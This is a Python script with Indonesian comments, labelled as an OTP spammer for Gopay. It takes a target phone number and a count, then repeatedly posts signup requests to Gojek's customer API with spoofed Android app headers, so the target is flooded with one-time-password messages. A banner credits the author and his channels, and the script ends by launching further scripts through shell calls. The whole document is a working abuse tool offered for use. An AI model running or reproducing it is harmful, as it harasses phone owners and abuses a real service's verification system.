#Apa tod? mau Recode?
#Tinggal pake apa susahnya_-
import os,sys,time,requests,subprocess
from requests import post
os.system("clear")
print ("\033[90m[\033[1;91m•\033[90m]\033[1;96m Spam Otp Gopay\033[90m[\033[1;91m•\033[90m]")
print ("\033[90m[\033[1;91m•\033[90m]\033[1;96m Limit 5 Spam setiap 30 Menit\033[90m[\033[1;91m•\033[90m]")
banner = """
\033[90m============================================
\033[1;91m Coded  \033[90m:\033[1;96mGabriel.S
\033[1;91m Youtube\033[90m:\033[1;96mApmzChannel\033[90m/\033[1;96mWin id
\033[1;91m Github \033[90m:\033[1;92mhttps://github.com/menang22
\033[90m============================================
"""
print (banner)
no = input("\033[90m[\033[1;91m!\033[90m]\033[1;96mmasukan nomor\033[90m:\033[1;91m")
jl = int(input("\033[90m[\033[1;91m!\033[90m]\033[1;96mMasukan Jumlah\033[90m: \033[1;91m"))
ua = {
"X-Session-ID": "f8b67b26-c6a4-44d2-9d86-8d93a80901c9",
"X-Platform": "Android",
"X-UniqueId": "8606f4e3b85968fd",
"X-AppVersion": "3.52.2",
"X-AppId": "com.gojek.app",
"Accept": "application/json",
"Authorization": "Bearer",
"X-User-Type": "customer",
"Accept-Language": "id-ID",
"X-User-Locale": "id_ID",
"Host": "api.gojekapi.com",
"Connection": "Keep-Alive",
"Accept-Encoding": "gzip",
"User-Agent": "okhttp/3.12.1"
}
dat = {
"email": "nsjwwiwiwisnsnn12@gmail.com",
"name": "akuinginterbang12",
"phone": no,
"signed_up_country": "ID"
}
for i in range(jl):
    time.sleep(2)
    r = requests.post("https://api.gojekapi.com/v5/customers", data=dat, headers=ua)
    print ("\033[90m[\033[1;92m•\033[90m]\033[1;97mStatus:\033[1;92m", r.json()["success"])

asu = input("\033[1;91mexit\033[90m/\033[1;91mwaiting\033[1;97m? \033[90m(ex/wait): ")
if asu == "ex":
   sys.exit()
elif asu == "wait":
     subprocess.call("php load.php",shell=True)
     subprocess.call("python spam.py",shell=True)
else:
    print ("\033[1;91mWrong Input!!\033[1;97m")
    sys.exit()
